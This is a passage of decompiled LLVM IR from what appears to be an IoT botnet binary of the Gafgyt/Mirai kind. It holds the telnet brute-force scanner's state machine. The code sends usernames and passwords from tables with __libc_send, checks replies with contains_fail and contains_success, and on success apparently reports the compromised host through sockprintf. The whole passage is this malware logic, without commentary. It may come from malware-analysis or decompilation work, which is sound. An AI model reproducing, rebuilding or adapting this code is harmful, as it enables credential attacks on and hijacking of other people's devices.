  br label %dec_label_pc_f248

dec_label_pc_e804:                                ; preds = %dec_label_pc_e610
  store i32 %v5_e6e8, i32* %r3.global-to-local, align 4
  %v3_e808 = icmp eq i32 %v5_e6e8, -1
  br i1 %v3_e808, label %dec_label_pc_e810, label %dec_label_pc_e834

dec_label_pc_e810:                                ; preds = %dec_label_pc_e804
  store i32 %v3_e0d0, i32* %r2.global-to-local, align 4
  store i32 %v2_e0dc, i32* %r3.global-to-local, align 4
  %v3_e82c = call i32 @reset_telstate(i32 %v2_e0dc, i32 %v3_df74, i32 %v3_e0d0)
  br label %dec_label_pc_f248

dec_label_pc_e834:                                ; preds = %dec_label_pc_e804
  store i32 %v3_e0d0, i32* %r2.global-to-local, align 4
  %v2_e850 = add i32 %v2_e0d8, %v2_e84c
  store i32 %v2_e850, i32* %r3.global-to-local, align 4
  %v1_e854 = inttoptr i32 %v2_e850 to i32*
  %v2_e854 = load i32, i32* %v1_e854, align 4
  store i32 %v2_e854, i32* %r3.global-to-local, align 4
  %v1_e858 = add i32 %v2_e854, 5
  store i32 %v1_e858, i32* @r4, align 4
  %v2_e860 = call i32 @__GI_time(i32* null)
  store i32 %v2_e860, i32* %r3.global-to-local, align 4
  %v0_e868 = load i32, i32* @r4, align 4
  %v3_e868 = icmp ult i32 %v0_e868, %v2_e860
  br i1 %v3_e868, label %dec_label_pc_e870, label %dec_label_pc_f248

dec_label_pc_e870:                                ; preds = %dec_label_pc_e834
  store i32 %v3_e0d0, i32* %r2.global-to-local, align 4
  store i32 %v2_e0dc, i32* %r3.global-to-local, align 4
  %v3_e88c = call i32 @reset_telstate(i32 %v2_e0dc, i32 %v3_df74, i32 %v3_e0d0)
  br label %dec_label_pc_f248

dec_label_pc_e894:                                ; preds = %dec_label_pc_e128
  store i32 %v3_e0d0, i32* %r2.global-to-local, align 4
  store i32 %v2_e0dc, i32* %r3.global-to-local, align 4
  %v1_e8ac = inttoptr i32 %v2_e0dc to i32*
  %v2_e8ac = load i32, i32* %v1_e8ac, align 4
  store i32 %v2_e8ac, i32* %ip.global-to-local, align 4
  store i32 %v3_e0d0, i32* %r2.global-to-local, align 4
  %v2_e8cc = add i32 %v2_e0d8, %v2_e8c8
  store i32 %v2_e8cc, i32* %r3.global-to-local, align 4
  %v1_e8d0 = inttoptr i32 %v2_e8cc to i32*
  %v2_e8d0 = load i32, i32* %v1_e8d0, align 4
  store i32 %v2_e8d0, i32* %r2.global-to-local, align 4
  %v1_e8d8 = load i32, i32* @sp, align 4
  %v2_e8d8 = inttoptr i32 %v1_e8d8 to i32*
  store i32 ptrtoint (i32* @global_var_261d4 to i32), i32* %v2_e8d8, align 4
  %v0_e8dc = load i32, i32* %ip.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  %v4_e8e8 = inttoptr i32 %v2_e8d0 to i8*
  %v5_e8e8 = call i32 @read_until_response(i32 %v0_e8dc, i32 %arg1, i8* %v4_e8e8, i32 512)
  %v2_e8f0 = icmp eq i32 %v5_e8e8, 0
  store i32 %storemerge553, i32* %r3.global-to-local, align 4
  br i1 %v2_e8f0, label %dec_label_pc_e980, label %dec_label_pc_e8f8

dec_label_pc_e8f8:                                ; preds = %dec_label_pc_e894
  store i32 %v3_e0d0, i32* %r2.global-to-local, align 4
  %v2_e914 = add i32 %v2_e0dc, 24
  store i32 %v2_e914, i32* %r3.global-to-local, align 4
  %v1_e918 = inttoptr i32 %v2_e914 to i32*
  %v2_e918 = load i32, i32* %v1_e918, align 4
  store i32 %v2_e918, i32* %r3.global-to-local, align 4
  %v1_e920 = call i32 @contains_fail(i32 %v2_e918)
  %v2_e928 = icmp eq i32 %v1_e920, 0
  store i32 %v3_e0d0, i32* %r2.global-to-local, align 4
  store i32 %v2_e0dc, i32* %r3.global-to-local, align 4
  br i1 %v2_e928, label %dec_label_pc_e958, label %dec_label_pc_e930

dec_label_pc_e930:                                ; preds = %dec_label_pc_e8f8
  %v3_e950 = call i32 @advance_state(i32* %v1_e8ac, i32 0)
  br label %dec_label_pc_f248

dec_label_pc_e958:                                ; preds = %dec_label_pc_e8f8
  %v3_e978 = call i32 @advance_state(i32* %v1_e8ac, i32 3)
  br label %dec_label_pc_f248

dec_label_pc_e980:                                ; preds = %dec_label_pc_e894
  store i32 %v3_e0d0, i32* %r2.global-to-local, align 4
  store i32 %v2_e0e0, i32* %r3.global-to-local, align 4
  %v2_e9a0 = load i32, i32* %v1_e0e4, align 4
  store i32 %v2_e9a0, i32* %r3.global-to-local, align 4
  %v1_e9a4 = add i32 %v2_e9a0, 7
  store i32 %v1_e9a4, i32* @r4, align 4
  %v2_e9ac = call i32 @__GI_time(i32* null)
  store i32 %v2_e9ac, i32* %r3.global-to-local, align 4
  %v0_e9b4 = load i32, i32* @r4, align 4
  %v3_e9b4 = icmp ult i32 %v0_e9b4, %v2_e9ac
  br i1 %v3_e9b4, label %dec_label_pc_e9bc, label %dec_label_pc_f248

dec_label_pc_e9bc:                                ; preds = %dec_label_pc_e980
  store i32 %v3_e0d0, i32* %r2.global-to-local, align 4
  store i32 %v2_e0dc, i32* %r3.global-to-local, align 4
  %v3_e9d8 = call i32 @reset_telstate(i32 %v2_e0dc, i32 %v3_df74, i32 %v3_e0d0)
  br label %dec_label_pc_f248

dec_label_pc_e9e0:                                ; preds = %dec_label_pc_e128
  store i32 %v3_e0d0, i32* %r2.global-to-local, align 4
  store i32 %v2_e0dc, i32* %r3.global-to-local, align 4
  %v1_e9f8 = inttoptr i32 %v2_e0dc to i32*
  %v2_e9f8 = load i32, i32* %v1_e9f8, align 4
  store i32 %v2_e9f8, i32* @r4, align 4
  store i32 %v3_e0d0, i32* %r2.global-to-local, align 4
  %v2_ea18 = add i32 %v2_e0dc, 8
  store i32 %v2_ea18, i32* %r3.global-to-local, align 4
  %v1_ea1c = add i32 %v2_e0dc, 10
  %v2_ea1c = inttoptr i32 %v1_ea1c to i8*
  %v3_ea1c = load i8, i8* %v2_ea1c, align 2
  %v4_ea1c = zext i8 %v3_ea1c to i32
  store i32 %v4_ea1c, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([8 x i8*]* @global_var_26188.501 to i32), i32* %r3.global-to-local, align 4
  %v4_ea28 = mul nuw nsw i32 %v4_ea1c, 4
  %v5_ea28 = add i32 %v4_ea28, ptrtoint ([8 x i8*]* @global_var_26188.501 to i32)
  %v6_ea28 = inttoptr i32 %v5_ea28 to i32*
  %v7_ea28 = load i32, i32* %v6_ea28, align 4
  store i32 %v7_ea28, i32* @r5, align 4
  store i32 %v3_e0d0, i32* %r2.global-to-local, align 4
  store i32 %v2_ea18, i32* %r3.global-to-local, align 4
  %v3_ea4c = load i8, i8* %v2_ea1c, align 2
  %v4_ea4c = zext i8 %v3_ea4c to i32
  store i32 %v4_ea4c, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([8 x i8*]* @global_var_26188.501 to i32), i32* %r3.global-to-local, align 4
  %v4_ea58 = mul nuw nsw i32 %v4_ea4c, 4
  %v5_ea58 = add i32 %v4_ea58, ptrtoint ([8 x i8*]* @global_var_26188.501 to i32)
  %v6_ea58 = inttoptr i32 %v5_ea58 to i32*
  %v7_ea58 = load i32, i32* %v6_ea58, align 4
  store i32 %v7_ea58, i32* %r3.global-to-local, align 4
  %v1_ea5c = inttoptr i32 %v7_ea58 to i8*
  %v3_ea60 = call i32 @strlen(i8* %v1_ea5c)
  %v0_ea68 = load i32, i32* @r4, align 4
  %v0_ea6c = load i32, i32* @r5, align 4
  store i32 %v3_ea60, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_ea78 = inttoptr i32 %v0_ea6c to i32*
  %v5_ea78 = call i32 @__libc_send(i32 %v0_ea68, i32* %v4_ea78, i32 %v3_ea60, i32 16384)
  %v1_ea80 = icmp slt i32 %v5_ea78, 0
  store i32 %v3_e0d0, i32* %r2.global-to-local, align 4
  store i32 %v2_e0dc, i32* %r3.global-to-local, align 4
  br i1 %v1_ea80, label %dec_label_pc_ea88, label %dec_label_pc_eaac

dec_label_pc_ea88:                                ; preds = %dec_label_pc_e9e0
  %v3_eaa4 = call i32 @reset_telstate(i32 %v2_e0dc, i32 %v3_df74, i32 %v3_e0d0)
  br label %dec_label_pc_f248

dec_label_pc_eaac:                                ; preds = %dec_label_pc_e9e0
  %v2_eac4 = load i32, i32* %v1_e9f8, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v6_ead8 = call i32 @__libc_send(i32 %v2_eac4, i32* bitcast ([3 x i8]* @global_var_1bdc0.503 to i32*), i32 2, i32 16384)
  %v1_eae0 = icmp slt i32 %v6_ead8, 0
  store i32 %v3_e0d0, i32* %r2.global-to-local, align 4
  store i32 %v2_e0dc, i32* %r3.global-to-local, align 4
  br i1 %v1_eae0, label %dec_label_pc_eae8, label %dec_label_pc_eb0c

dec_label_pc_eae8:                                ; preds = %dec_label_pc_eaac
  %v3_eb04 = call i32 @reset_telstate(i32 %v2_e0dc, i32 %v3_df74, i32 %v3_e0d0)
  br label %dec_label_pc_f248

dec_label_pc_eb0c:                                ; preds = %dec_label_pc_eaac
  %v3_eb2c = call i32 @advance_state(i32* nonnull %v1_e9f8, i32 4)
  br label %dec_label_pc_f248

dec_label_pc_eb34:                                ; preds = %dec_label_pc_e128
  store i32 %v3_e0d0, i32* %r2.global-to-local, align 4
  store i32 %v2_e0dc, i32* %r3.global-to-local, align 4
  %v1_eb4c = inttoptr i32 %v2_e0dc to i32*
  %v2_eb4c = load i32, i32* %v1_eb4c, align 4
  store i32 %v2_eb4c, i32* %ip.global-to-local, align 4
  store i32 %v3_e0d0, i32* %r2.global-to-local, align 4
  %v2_eb6c = add i32 %v2_e0d8, %v2_e8c8
  store i32 %v2_eb6c, i32* %r3.global-to-local, align 4
  %v1_eb70 = inttoptr i32 %v2_eb6c to i32*
  %v2_eb70 = load i32, i32* %v1_eb70, align 4
  store i32 %v2_eb70, i32* %r2.global-to-local, align 4
  %v1_eb78 = load i32, i32* @sp, align 4
  %v2_eb78 = inttoptr i32 %v1_eb78 to i32*
  store i32 ptrtoint (i32* @global_var_261d4 to i32), i32* %v2_eb78, align 4
  %v0_eb7c = load i32, i32* %ip.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  %v4_eb88 = inttoptr i32 %v2_eb70 to i8*
  %v5_eb88 = call i32 @read_until_response(i32 %v0_eb7c, i32 %arg1, i8* %v4_eb88, i32 512)
  %v2_eb90 = icmp eq i32 %v5_eb88, 0
  store i32 %storemerge553, i32* %r3.global-to-local, align 4
  br i1 %v2_eb90, label %dec_label_pc_ec20, label %dec_label_pc_eb98

dec_label_pc_eb98:                                ; preds = %dec_label_pc_eb34
  store i32 %v3_e0d0, i32* %r2.global-to-local, align 4
  %v2_ebb4 = add i32 %v2_e0dc, 24
  store i32 %v2_ebb4, i32* %r3.global-to-local, align 4
  %v1_ebb8 = inttoptr i32 %v2_ebb4 to i32*
  %v2_ebb8 = load i32, i32* %v1_ebb8, align 4
  store i32 %v2_ebb8, i32* %r3.global-to-local, align 4
  %v1_ebc0 = call i32 @contains_fail(i32 %v2_ebb8)
  %v2_ebc8 = icmp eq i32 %v1_ebc0, 0
  store i32 %v3_e0d0, i32* %r2.global-to-local, align 4
  store i32 %v2_e0dc, i32* %r3.global-to-local, align 4
  br i1 %v2_ebc8, label %dec_label_pc_ebf8, label %dec_label_pc_ebd0

dec_label_pc_ebd0:                                ; preds = %dec_label_pc_eb98
  %v3_ebf0 = call i32 @advance_state(i32* %v1_eb4c, i32 0)
  br label %dec_label_pc_f248

dec_label_pc_ebf8:                                ; preds = %dec_label_pc_eb98
  %v3_ec18 = call i32 @advance_state(i32* %v1_eb4c, i32 5)
  br label %dec_label_pc_f248

dec_label_pc_ec20:                                ; preds = %dec_label_pc_eb34
  store i32 %v3_e0d0, i32* %r2.global-to-local, align 4
  store i32 %v2_e0e0, i32* %r3.global-to-local, align 4
  %v2_ec40 = load i32, i32* %v1_e0e4, align 4
  store i32 %v2_ec40, i32* %r3.global-to-local, align 4
  %v1_ec44 = add i32 %v2_ec40, 3
  store i32 %v1_ec44, i32* @r4, align 4
  %v2_ec4c = call i32 @__GI_time(i32* null)
  store i32 %v2_ec4c, i32* %r3.global-to-local, align 4
  %v0_ec54 = load i32, i32* @r4, align 4
  %v3_ec54 = icmp ult i32 %v0_ec54, %v2_ec4c
  br i1 %v3_ec54, label %dec_label_pc_ec5c, label %dec_label_pc_f248

dec_label_pc_ec5c:                                ; preds = %dec_label_pc_ec20
  store i32 %v3_e0d0, i32* %r2.global-to-local, align 4
  store i32 %v2_e0dc, i32* %r3.global-to-local, align 4
  %v3_ec78 = call i32 @reset_telstate(i32 %v2_e0dc, i32 %v3_df74, i32 %v3_e0d0)
  br label %dec_label_pc_f248

dec_label_pc_ec80:                                ; preds = %dec_label_pc_e128
  store i32 %v3_e0d0, i32* %r2.global-to-local, align 4
  store i32 %v2_e0dc, i32* %r3.global-to-local, align 4
  %v1_ec98 = inttoptr i32 %v2_e0dc to i32*
  %v2_ec98 = load i32, i32* %v1_ec98, align 4
  store i32 %v2_ec98, i32* @r4, align 4
  store i32 %v3_e0d0, i32* %r2.global-to-local, align 4
  %v2_ecb8 = add i32 %v2_e0dc, 8
  store i32 %v2_ecb8, i32* %r3.global-to-local, align 4
  %v1_ecbc = add i32 %v2_e0dc, 11
  %v2_ecbc = inttoptr i32 %v1_ecbc to i8*
  %v3_ecbc = load i8, i8* %v2_ecbc, align 1
  %v4_ecbc = zext i8 %v3_ecbc to i32
  store i32 %v4_ecbc, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([4 x i8*]* @global_var_26198.505 to i32), i32* %r3.global-to-local, align 4
  %v4_ecc8 = mul nuw nsw i32 %v4_ecbc, 4
  %v5_ecc8 = add i32 %v4_ecc8, ptrtoint ([4 x i8*]* @global_var_26198.505 to i32)
  %v6_ecc8 = inttoptr i32 %v5_ecc8 to i32*
  %v7_ecc8 = load i32, i32* %v6_ecc8, align 4
  store i32 %v7_ecc8, i32* @r5, align 4
  store i32 %v3_e0d0, i32* %r2.global-to-local, align 4
  store i32 %v2_ecb8, i32* %r3.global-to-local, align 4
  %v3_ecec = load i8, i8* %v2_ecbc, align 1
  %v4_ecec = zext i8 %v3_ecec to i32
  store i32 %v4_ecec, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([4 x i8*]* @global_var_26198.505 to i32), i32* %r3.global-to-local, align 4
  %v4_ecf8 = mul nuw nsw i32 %v4_ecec, 4
  %v5_ecf8 = add i32 %v4_ecf8, ptrtoint ([4 x i8*]* @global_var_26198.505 to i32)
  %v6_ecf8 = inttoptr i32 %v5_ecf8 to i32*
  %v7_ecf8 = load i32, i32* %v6_ecf8, align 4
  store i32 %v7_ecf8, i32* %r3.global-to-local, align 4
  %v1_ecfc = inttoptr i32 %v7_ecf8 to i8*
  %v3_ed00 = call i32 @strlen(i8* %v1_ecfc)
  %v0_ed08 = load i32, i32* @r4, align 4
  %v0_ed0c = load i32, i32* @r5, align 4
  store i32 %v3_ed00, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_ed18 = inttoptr i32 %v0_ed0c to i32*
  %v5_ed18 = call i32 @__libc_send(i32 %v0_ed08, i32* %v4_ed18, i32 %v3_ed00, i32 16384)
  %v1_ed20 = icmp slt i32 %v5_ed18, 0
  store i32 %v3_e0d0, i32* %r2.global-to-local, align 4
  store i32 %v2_e0dc, i32* %r3.global-to-local, align 4
  br i1 %v1_ed20, label %dec_label_pc_ed28, label %dec_label_pc_ed4c

dec_label_pc_ed28:                                ; preds = %dec_label_pc_ec80
  %v3_ed44 = call i32 @reset_telstate(i32 %v2_e0dc, i32 %v3_df74, i32 %v3_e0d0)
  br label %dec_label_pc_f248

dec_label_pc_ed4c:                                ; preds = %dec_label_pc_ec80
  %v2_ed64 = load i32, i32* %v1_ec98, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v6_ed78 = call i32 @__libc_send(i32 %v2_ed64, i32* bitcast ([3 x i8]* @global_var_1bdc0.503 to i32*), i32 2, i32 16384)
  %v1_ed80 = icmp slt i32 %v6_ed78, 0
  store i32 %v3_e0d0, i32* %r2.global-to-local, align 4
  store i32 %v2_e0dc, i32* %r3.global-to-local, align 4
  br i1 %v1_ed80, label %dec_label_pc_ed88, label %dec_label_pc_edac

dec_label_pc_ed88:                                ; preds = %dec_label_pc_ed4c
  %v3_eda4 = call i32 @reset_telstate(i32 %v2_e0dc, i32 %v3_df74, i32 %v3_e0d0)
  br label %dec_label_pc_f248

dec_label_pc_edac:                                ; preds = %dec_label_pc_ed4c
  %v3_edcc = call i32 @advance_state(i32* nonnull %v1_ec98, i32 6)
  br label %dec_label_pc_f248

dec_label_pc_edd4:                                ; preds = %dec_label_pc_e128
  store i32 %v3_e0d0, i32* %r2.global-to-local, align 4
  store i32 %v2_e0dc, i32* %r3.global-to-local, align 4
  %v1_edec = inttoptr i32 %v2_e0dc to i32*
  %v2_edec = load i32, i32* %v1_edec, align 4
  store i32 %v2_edec, i32* %ip.global-to-local, align 4
  store i32 %v3_e0d0, i32* %r2.global-to-local, align 4
  %v2_ee0c = add i32 %v2_e0d8, %v2_e8c8
  store i32 %v2_ee0c, i32* %r3.global-to-local, align 4
  %v1_ee10 = inttoptr i32 %v2_ee0c to i32*
  %v2_ee10 = load i32, i32* %v1_ee10, align 4
  store i32 %v2_ee10, i32* %r2.global-to-local, align 4
  %v1_ee18 = load i32, i32* @sp, align 4
  %v2_ee18 = inttoptr i32 %v1_ee18 to i32*
  store i32 ptrtoint ([10 x i8*]* @global_var_26218.507 to i32), i32* %v2_ee18, align 4
  %v0_ee1c = load i32, i32* %ip.global-to-local, align 4
  store i32 512, i32* %r3.global-to-local, align 4
  %v4_ee28 = inttoptr i32 %v2_ee10 to i8*
  %v5_ee28 = call i32 @read_until_response(i32 %v0_ee1c, i32 %arg1, i8* %v4_ee28, i32 512)
  store i32 %v5_ee28, i32* %r3.global-to-local, align 4
  %v2_ee30 = icmp eq i32 %v5_ee28, 0
  br i1 %v2_ee30, label %dec_label_pc_f078, label %dec_label_pc_ee38

dec_label_pc_ee38:                                ; preds = %dec_label_pc_edd4
  store i32 %storemerge553, i32* @r4, align 4
  %v2_ee40 = call i32 @__GI_time(i32* null)
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_ee54 = load i32, i32* @r4, align 4
  %v2_ee60 = mul i32 %v0_ee54, 28
  %v2_ee68 = add i32 %v2_e84c, %v2_ee60
  %v2_ee6c = inttoptr i32 %v2_ee68 to i32*
  store i32 %v2_ee40, i32* %v2_ee6c, align 4
  store i32 %v3_e0d0, i32* %r2.global-to-local, align 4
  store i32 %v2_ee0c, i32* %r3.global-to-local, align 4
  %v2_ee90 = load i32, i32* %v1_ee10, align 4
  store i32 %v2_ee90, i32* %r3.global-to-local, align 4
  %v1_ee98 = call i32 @contains_fail(i32 %v2_ee90)
  store i32 %v1_ee98, i32* %r3.global-to-local, align 4
  %v2_eea0 = icmp eq i32 %v1_ee98, 0
  br i1 %v2_eea0, label %dec_label_pc_eed0, label %dec_label_pc_eea8

dec_label_pc_eea8:                                ; preds = %dec_label_pc_ee38
  store i32 %v3_e0d0, i32* %r2.global-to-local, align 4
  store i32 %v2_e0dc, i32* %r3.global-to-local, align 4
  %v3_eec8 = call i32 @advance_state(i32* %v1_edec, i32 0)
  br label %dec_label_pc_f248

dec_label_pc_eed0:                                ; preds = %dec_label_pc_ee38
  store i32 %v3_e0d0, i32* %r2.global-to-local, align 4
  store i32 %v2_ee0c, i32* %r3.global-to-local, align 4
  %v2_eef0 = load i32, i32* %v1_ee10, align 4
  store i32 %v2_eef0, i32* %r3.global-to-local, align 4
  %v1_eef8 = call i32 @contains_success(i32 %v2_eef0)
  store i32 %v1_eef8, i32* %r3.global-to-local, align 4
  %v2_ef00 = icmp eq i32 %v1_eef8, 0
  br i1 %v2_ef00, label %dec_label_pc_f028, label %dec_label_pc_ef08

dec_label_pc_ef08:                                ; preds = %dec_label_pc_eed0
  store i32 %v3_e0d0, i32* %r2.global-to-local, align 4
  %v2_ef24 = add i32 %v2_e0dc, 8
  store i32 %v2_ef24, i32* %r3.global-to-local, align 4
  %v1_ef28 = add i32 %v2_e0dc, 9
  %v2_ef28 = inttoptr i32 %v1_ef28 to i8*
  %v3_ef28 = load i8, i8* %v2_ef28, align 1
  %v4_ef28 = zext i8 %v3_ef28 to i32
  store i32 %v4_ef28, i32* %r3.global-to-local, align 4
  %v7_ef2c = icmp eq i8 %v3_ef28, 2
  br i1 %v7_ef2c, label %dec_label_pc_ef34, label %dec_label_pc_ef5c

dec_label_pc_ef34:                                ; preds = %dec_label_pc_ef08
  store i32 %v3_e0d0, i32* %r2.global-to-local, align 4
  store i32 %v2_e0dc, i32* %r3.global-to-local, align 4
  %v3_ef54 = call i32 @advance_state(i32* %v1_edec, i32 7)
  br label %dec_label_pc_f248

dec_label_pc_ef5c:                                ; preds = %dec_label_pc_ef08
  %v2_ef60 = load i32, i32* @global_var_265cc.54, align 4
  store i32 %v2_ef60, i32* @r4, align 4
  store i32 %v3_e0d0, i32* %r2.global-to-local, align 4
  store i32 %v2_e0dc, i32* %r3.global-to-local, align 4
  %v3_ef80 = call i32 @get_telstate_host(i32 %v2_e0dc, i32 %v3_df74, i32 %v3_e0d0)
  store i32 %v3_ef80, i32* %ip.global-to-local, align 4
  store i32 %v3_e0d0, i32* %r2.global-to-local, align 4
  store i32 %v2_ef24, i32* %r3.global-to-local, align 4
  %v1_efa8 = add i32 %v2_e0dc, 10
  %v2_efa8 = inttoptr i32 %v1_efa8 to i8*
  %v3_efa8 = load i8, i8* %v2_efa8, align 2
  %v4_efa8 = zext i8 %v3_efa8 to i32
  store i32 %v4_efa8, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([8 x i8*]* @global_var_26188.501 to i32), i32* %r3.global-to-local, align 4
  %v4_efb4 = mul nuw nsw i32 %v4_efa8, 4
  %v5_efb4 = add i32 %v4_efb4, ptrtoint ([8 x i8*]* @global_var_26188.501 to i32)
  %v6_efb4 = inttoptr i32 %v5_efb4 to i32*
  %v7_efb4 = load i32, i32* %v6_efb4, align 4
  store i32 %v7_efb4, i32* @lr, align 4
  store i32 %v3_e0d0, i32* %r2.global-to-local, align 4
  store i32 %v2_ef24, i32* %r3.global-to-local, align 4
  %v1_efd8 = add i32 %v2_e0dc, 11
  %v2_efd8 = inttoptr i32 %v1_efd8 to i8*
  %v3_efd8 = load i8, i8* %v2_efd8, align 1
  %v4_efd8 = zext i8 %v3_efd8 to i32
  store i32 %v4_efd8, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([4 x i8*]* @global_var_26198.505 to i32), i32* %r3.global-to-local, align 4
  %v4_efe4 = mul nuw nsw i32 %v4_efd8, 4
  %v5_efe4 = add i32 %v4_efe4, ptrtoint ([4 x i8*]* @global_var_26198.505 to i32)
  %v6_efe4 = inttoptr i32 %v5_efe4 to i32*
  %v7_efe4 = load i32, i32* %v6_efe4, align 4
  %v1_efe8 = load i32, i32* @sp, align 4
  %v2_efe8 = inttoptr i32 %v1_efe8 to i32*
  store i32 %v7_efe4, i32* %v2_efe8, align 4
  %v0_efec = load i32, i32* @r4, align 4
  %v0_eff4 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v0_eff4, i32* @r2, align 4
  %v0_eff8 = load i32, i32* @lr, align 4
  store i32 %v0_eff8, i32* %r3.global-to-local, align 4
  %v3_effc = call i32 @sockprintf(i32 %v0_efec, i32 ptrtoint ([23 x i8]* @global_var_1bdc4.510 to i32))
  store i32 %v3_e0d0, i32* %r2.global-to-local, align 4
  store i32 %v2_e0dc, i32* %r3.global-to-local, align 4
  %v3_f020 = call i32 @advance_state(i32* %v1_edec, i32 7)
  br label %dec_label_pc_f248

dec_label_pc_f028:                                ; preds = %dec_label_pc_eed0
  store i32 %v3_e0d0, i32* %r2.global-to-local, align 4
  store i32 %v2_e0dc, i32* %r3.global-to-local, align 4
  %v3_f044 = call i32 @reset_telstate(i32 %v2_e0dc, i32 %v3_df74, i32 %v3_e0d0)
  br label %dec_label_pc_f248

dec_label_pc_f078:                                ; preds = %dec_label_pc_edd4
  store i32 %v3_e0d0, i32* %r2.global-to-local, align 4
  %v2_f094 = add i32 %v2_e0d8, %v2_e84c
  store i32 %v2_f094, i32* %r3.global-to-local, align 4
  %v1_f098 = inttoptr i32 %v2_f094 to i32*
  %v2_f098 = load i32, i32* %v1_f098, align 4
  store i32 %v2_f098, i32* %r3.global-to-local, align 4
  %v1_f09c = add i32 %v2_f098, 7
  store i32 %v1_f09c, i32* @r4, align 4
  %v2_f0a4 = call i32 @__GI_time(i32* null)
  store i32 %v2_f0a4, i32* %r3.global-to-local, align 4
  %v0_f0ac = load i32, i32* @r4, align 4
  %v3_f0ac = icmp ult i32 %v0_f0ac, %v2_f0a4
  br i1 %v3_f0ac, label %dec_label_pc_f0b4, label %dec_label_pc_f248

dec_label_pc_f0b4:                                ; preds = %dec_label_pc_f078
  store i32 %v3_e0d0, i32* %r2.global-to-local, align 4
  store i32 %v2_e0dc, i32* %r3.global-to-local, align 4
  %v3_f0d0 = call i32 @reset_telstate(i32 %v2_e0dc, i32 %v3_df74, i32 %v3_e0d0)
  br label %dec_label_pc_f248

dec_label_pc_f0d8:                                ; preds = %dec_label_pc_e128
  store i32 %storemerge553, i32* @r4, align 4
  %v2_f0e0 = call i32 @__GI_time(i32* null)
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_f0f4 = load i32, i32* @r4, align 4
  %v2_f100 = mul i32 %v0_f0f4, 28
  %v2_f108 = add i32 %v2_e84c, %v2_f100
  %v2_f10c = inttoptr i32 %v2_f108 to i32*
  store i32 %v2_f0e0, i32* %v2_f10c, align 4
  store i32 %v3_e0d0, i32* %r2.global-to-local, align 4
  store i32 %v2_e0dc, i32* %r3.global-to-local, align 4
  %v1_f128 = inttoptr i32 %v2_e0dc to i32*
  %v2_f128 = load i32, i32* %v1_f128, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v6_f13c = call i32 @__libc_send(i32 %v2_f128, i32* bitcast ([5 x i8]* @global_var_1bddc.512 to i32*), i32 4, i32 16384)
  store i32 %v3_e0d0, i32* %r2.global-to-local, align 4
  store i32 %v2_e0dc, i32* %r3.global-to-local, align 4
  %v2_f158 = load i32, i32* %v1_f128, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v6_f16c = call i32 @__libc_send(i32 %v2_f158, i32* bitcast ([8 x i8]* @global_var_1bde4.514 to i32*), i32 7, i32 16384)
  store i32 %v3_e0d0, i32* %r2.global-to-local, align 4
  store i32 %v2_e0dc, i32* %r3.global-to-local, align 4
  %v2_f188 = load i32, i32* %v1_f128, align 4
  store i32 %v2_f188, i32* @r4, align 4
  %v2_f190 = load i32, i32* bitcast ([412 x i8]** @global_var_26184.517 to i32*), align 4
  store i32 %v2_f190, i32* @r5, align 4
  store i32 %v2_f190, i32* %r3.global-to-local, align 4
  %v1_f19c = inttoptr i32 %v2_f190 to i8*
  %v3_f1a0 = call i32 @strlen(i8* %v1_f19c)
  %v0_f1a8 = load i32, i32* @r4, align 4
  %v0_f1ac = load i32, i32* @r5, align 4
  store i32 %v3_f1a0, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %tmp44 = inttoptr i32 %v0_f1ac to i32*
  %v6_f1b8 = call i32 @__libc_send(i32 %v0_f1a8, i32* %tmp44, i32 %v3_f1a0, i32 16384)
  store i32 %v6_f1b8, i32* %r3.global-to-local, align 4
  %v1_f1c0 = icmp slt i32 %v6_f1b8, 0
  br i1 %v1_f1c0, label %dec_label_pc_f1c8, label %dec_label_pc_f1ec

dec_label_pc_f1c8:                                ; preds = %dec_label_pc_f0d8
  store i32 %v3_e0d0, i32* %r2.global-to-local, align 4
  store i32 %v2_e0dc, i32* %r3.global-to-local, align 4
  %v3_f1e4 = call i32 @reset_telstate(i32 %v2_e0dc, i32 %v3_df74, i32 %v3_e0d0)
  br label %dec_label_pc_f248

dec_label_pc_f1ec:                                ; preds = %dec_label_pc_f0d8
  store i32 %v3_e0d0, i32* %r2.global-to-local, align 4
  %v2_f208 = add i32 %v2_e0d8, %v2_e84c
  store i32 %v2_f208, i32* %r3.global-to-local, align 4
  %v1_f20c = inttoptr i32 %v2_f208 to i32*
  %v2_f20c = load i32, i32* %v1_f20c, align 4
  store i32 %v2_f20c, i32* %r3.global-to-local, align 4
  %v1_f210 = add i32 %v2_f20c, 25
  store i32 %v1_f210, i32* @r4, align 4
  %v2_f218 = call i32 @__GI_time(i32* null)
  store i32 %v2_f218, i32* %r3.global-to-local, align 4
  %v0_f220 = load i32, i32* @r4, align 4
  %v3_f220 = icmp ult i32 %v0_f220, %v2_f218
  br i1 %v3_f220, label %dec_label_pc_f228, label %dec_label_pc_f248

dec_label_pc_f228:                                ; preds = %dec_label_pc_f1ec
  store i32 %v3_e0d0, i32* %r2.global-to-local, align 4
  store i32 %v2_e0dc, i32* %r3.global-to-local, align 4
  %v3_f244 = call i32 @reset_telstate(i32 %v2_e0dc, i32 %v3_df74, i32 %v3_e0d0)
  br label %dec_label_pc_f248

